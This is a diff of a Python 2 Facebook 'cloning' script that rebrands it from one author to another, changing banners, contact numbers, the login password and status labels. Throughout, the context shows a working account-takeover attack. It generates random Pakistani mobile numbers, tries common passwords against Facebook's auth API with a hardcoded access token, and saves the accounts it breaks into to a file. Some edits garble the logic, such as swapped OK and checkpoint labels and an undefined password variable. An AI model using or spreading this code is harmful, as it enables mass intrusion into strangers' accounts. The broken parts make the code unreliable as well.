@@ -2,7 +2,7 @@
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(40000):
+for n in range(5000):
  
     nmbr = random.randint(1111111, 9999999)
     
@@ -88,14 +88,14 @@ print  """
 
 \033[1;91m              WELCOME TO ARADIN CLONING :)) 
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;92m➣ \033[1;96mHATERX MAKES ME FAMOUS (^o^) ..
+\033[1;92m➣ \033[1;96mTHANKS FOR USE MY COMMANDS (^o^) ..
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;92m➣ \033[1;92mDEVOLPER   :            Yunus 
-\033[1;91m➣ \033[1;92mFACEBOOK   :            Zo H An
-\033[1;93m➣ \033[1;92mWHATSAPP   :            +923404708884 
-\033[1;96m➣ \033[1;92mGITHUB     :            The-Yunus-2003x18
+\033[1;92m➣ \033[1;92mDEVOLPER   :         ARADIN 
+\033[1;91m➣ \033[1;92mFACEBOOK   :       Illıllı Ɩɱtɩʌʑ Illıllı 
+\033[1;93m➣ \033[1;92mWHATSAPP  :        +923237528063 
+\033[1;96m➣ \033[1;92mGITHUB         :        ARADIN110
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;92m➣ \033[1;96mCloning Ids Open 10 days..
+\033[1;92m➣ \033[1;96mCloning Ids Open 4To7 days..
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••             
 """
  
@@ -110,34 +110,33 @@ logo1 = """
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91m➣ \033[1;96mYOU CAN COPY MY STYLE BUT YOU CAN'T BE ME ..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;91m➣ DEVOLPER     :        Yunus
-\033[1;92m➣ FACEBOOK     :        Zo H An
-\033[1;97m➣ GITHUB       :        The-Younus-2003x18
-\033[1;93m➣ WHATAAPP     :        +923404708884
+\033[1;91m➣ DEVOLPER     :        ARADIN
+\033[1;92m➣ FACEBOOK     :      Illıllı Ɩɱtɩʌʑ Illıllı 
+\033[1;97m➣ GITHUB       :        ARADIN110
+\033[1;93m➣ WHATAAPP     :        +923237528063
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;91m➣ \033[1;96mYOU CAN COPY ME BUT YOU CAN'T BE ME..
+\033[1;91m➣ \033[1;96mTHANKS FOR USE ME I LOVE YOU BRO ❤..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
 """
 logo2 = """
-\033[1;91m▒▄█▀▀█▐██▒██▄░▒█▌░▐█▀█▄░▐█░▐█░▐██
-\033[1;91m▒▀▀█▄▄░█▌▒▐█▒█▒█░░▐█▌▐█░▐████─░█▌
-\033[1;91m▒█▄▄█▀▐██▒██░▒██▌░▐█▄█▀░▐█░▐█░▐██
-\033[1;92m➣      LEGEND OF DG KHAN (Dera Ghazi Khan) 
-\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••   
-\033[1;96m➣ \033[1;93mHATERZ MAKES ME FAMOUS ...
+print '\033[1;93m▐██▒▐██▄▒▄██▌▒█▀█▀█▐██░░▄█▀▄─▒▐█▀▀▀█▌
+print '\033[1;94m░█▌░▒█░▒█░▒█░░░▒█░░░█▌░▐█▄▄▐█░▒▄▄█▀▀░
+print '\033[1;91m▐██▒▐█░░░░▒█▌░▒▄█▄░▐██░▐█─░▐█▒▐█▄▄▄█▌
+\033[1;92m➣     IMTIAZ ARADIN SINDHI CLONING  
+\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••   
+\033[1;96m➣ \033[1;93mI THANKS FOR USE MY COMMANDS ...
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••    
-\033[1;91m➣ \033[1;92mAUTHOR    :   \033[1;97mYUNUS
-\033[1;92m➣ \033[1;93mFACEBOOK  :   \033[1;97mZOHAN
-\033[1;93m➣ \033[1;91mWHATSAPP  :   \033[1;97m+923404708884 
-\033[1;94m➣ \033[1;96mGITHUB    :   \033[1;97mThe-Yunus-2003x18
-\033[1;96m➣ \033[1;92mTEAM      :   \033[1;97mThe Yunus Y-Tech Programming
-\033[1;91m➣ \033[1;93mVERSION   :   \033[1;97m1.0.2
+\033[1;91m➣ \033[1;92mAUTHOR    :   \033[1;97m IMTIAZ
+\033[1;92m➣ \033[1;93mFACEBOOK  :   \033[1;97mIllıllı Ɩɱtɩʌʑ Illıllı 
+\033[1;93m➣ \033[1;91mWHATSAPP  :   \033[1;97m+923237528063 
+\033[1;94m➣ \033[1;96mGITHUB    :   \033[1;97mARADIN110
+\033[1;91m➣ \033[1;93mVERSION   :   \033[1;97m1.0
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;91m➣ \033[1;93mCP IDS Open After 10 Days..
+\033[1;91m➣ \033[1;93mCP IDS Open After 4To7 Days..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••     
 """
-CorrectUsername = "Yunus"
-CorrectPassword = "Elina"
+CorrectUsername = "IMTIAZ"
+CorrectPassword = "ARADIN"
  
 loop = 'true'
 while (loop == 'true'):
@@ -150,10 +149,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://www.facebook.com/The.Yunus.2003x18')
+            os.system('xdg-open https://m.youtube.com/channel/UCaBSCTs3kfwD3OhU6XC4ZwA')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/The.Yunus.2003x18')
+        os.system('xdg-open https://m.youtube.com/channel/UCaBSCTs3kfwD3OhU6XC4ZwA')
  
  
  
@@ -198,9 +197,13 @@ def action():
     elif peak =="1":              
         os.system("clear")
         print logo2
-        print "\033[1;91m➣ \033[1;97mEnter any Pakistan Mobile code Number"+'\n'
+        print "\033[1;91m➣ \033[1;97mEnter any Pakistan Mobile code Number Jazz [03 FAST]"+'\n'
         print '\033[1;92m➣ \033[1;93mExample'
-        print '\033[1;92m[+] Jazz    :  00 01 02 03 04 05 06 07 08 09   \033[1;92m[+] Zong    :  10 11 12 13 14 15 16 17 18      \033[1;92m[+] Warid   :  22 23 24 25                     \033[1;92m[+] Ufone   :  31 32 33 34 35 36 37 38         [+] Telenor :  40 41 42 43 44 45 46 47 48 49' 
+        print '\033[1;92m[+] Jazz   [FAST 03] :  00 01 02 03 04 05 06 07 08 09                      \033[1;92m        [+] Telenor :  40 41 42 43 44 45 46 47 48 49' 
+        print '\033[1;92m[+] Zong    :  10 11 12 13 14 15 16 17 18
+        print '\033[1;92m[+] Warid   :  22 23 24 25 
+        print '\033[1;92m[+] Ufone   :  31 32 33 34 35 36 37 38 
+        print '\033[1;92m[+] Telenor :  40 41 42 43 44 45 46 47 48 49
         try:
             c = raw_input("\033[1;92m➣ \033[1;97mCHOOSE : ")
             k="03"
@@ -235,14 +238,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m[ARADIN-OK] ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/Checkpoint.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;93m[ARADIN-CP] ' + k + c + user + '  |  ' + pass1
                     cps = open('save/Checkpoint.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -252,31 +255,31 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[Successfull] ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;93m[ARADIN-CP] ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/Checkpoint.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;92m[ARADIN-OK] ' + k + c + user + '  |  ' + pass2
                             cps = open('save/Checkpoint.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="123456"
+                            pass3="786110"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;93m[ARADIN-CP] ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/Checkpoint.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                if 'www.facebook.com' in q['error_msg']:
-                                   print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass3
+                                   print '\033[1;92m[ARADIN-OK] ' + k + c + user + '  |  ' + pass3
                                    cps = open('save/Checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
@@ -292,7 +295,7 @@ def action():
     print 'Process Has Been Completed ...'
     print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
     print('Cloned Accounts Has Been Saved : save/Checkpoint')
-    jalan("Note : Your Checkpoint Accounts Will Open after  10 days")
+    jalan("Note : Your Checkpoint Accounts Will Open after  4To7 days")
     print ''
     print """
     \033[1;92m.                                  _____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________
